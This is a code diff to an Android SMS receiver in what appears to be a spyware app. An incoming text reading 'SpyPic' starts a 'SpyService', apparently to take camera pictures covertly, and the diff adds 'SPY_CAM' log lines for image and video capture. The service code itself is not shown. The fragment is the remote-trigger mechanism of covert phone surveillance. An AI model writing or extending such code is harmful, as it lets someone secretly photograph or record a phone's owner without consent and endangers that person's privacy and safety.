@@ -5,6 +5,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
+import android.util.Log;
 
 
 public class SmsReceiver extends BroadcastReceiver {
@@ -24,16 +25,17 @@ public class SmsReceiver extends BroadcastReceiver {
                         msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                         msg_from = msgs[i].getOriginatingAddress();
                         msgBody = msgs[i].getMessageBody();
-                        if (msgBody.equals("capture")) {
-                            System.out.println("working");
+                        if (msgBody.equals("SpyPic")) {
+                            Log.i("SPY_CAM" , "Capturing Image");
                             Intent serviceIntent = new Intent(context, SpyService.class);
                             context.startService(serviceIntent);
-                        } else if (msgBody.equals("recvideo")) {
+                        } else if (msgBody.equals("SpyVideo")) {
+                            Log.i("SPY_CAM" , "Capturing Video");
                             System.out.println("working");
                         }
                     }
                 } catch (Exception e) {
-//                            Log.d("Exception caught",e.getMessage());
+                            Log.d("Exception caught", e.getMessage());
                 }
             }
         }
